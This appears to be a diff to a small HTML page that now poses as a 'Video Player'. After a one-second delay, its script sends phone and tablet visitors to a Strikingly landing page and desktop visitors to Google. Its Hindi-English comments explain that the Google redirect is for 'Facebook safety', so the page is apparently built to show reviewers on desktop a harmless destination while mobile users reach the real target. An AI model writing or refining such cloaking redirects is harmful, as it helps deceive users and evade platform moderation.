@@ -1,24 +1,30 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>Video Player</title>
     <script>
-        // Check if device is Touch Screen (Mobile/Tablet)
-        var isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-        
-        if (isTouchDevice) {
-            // AGAR MOBILE HAI: Toh seedha aapke landing page par bhej do
-            window.location.href = "https://muskan1.mystrikingly.com/";
-        } else {
-            // AGAR LAPTOP/PC HAI: Toh Google par bhej do (Safety ke liye)
-            window.location.href = "https://www.google.com";
+        function checkDevice() {
+            // Mobile check using User Agent, Screen Width, and Touch Points
+            var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) || 
+                           (window.innerWidth < 1200 && ('ontouchstart' in window || navigator.maxTouchPoints > 0));
+
+            if (isMobile) {
+                // AGAR MOBILE HAI: Toh aapka asli Strikingly link khulega
+                window.location.href = "https://silver-mint-ss9kl5.mystrikingly.com/";
+            } else {
+                // AGAR LAPTOP HAI: Toh Google par bhej dega (Facebook safety)
+                window.location.href = "https://www.google.com";
+            }
         }
+        
+        // 1 second ke delay ke baad redirect karega
+        setTimeout(checkDevice, 1000);
     </script>
 </head>
-<body style="background: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial;">
-    <p>Loading... Please wait.</p>
+<body style="background:black; color:white; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
+    <div style="text-align:center;">
+        <p>Loading Video Player...</p>
+    </div>
 </body>
 </html>
 
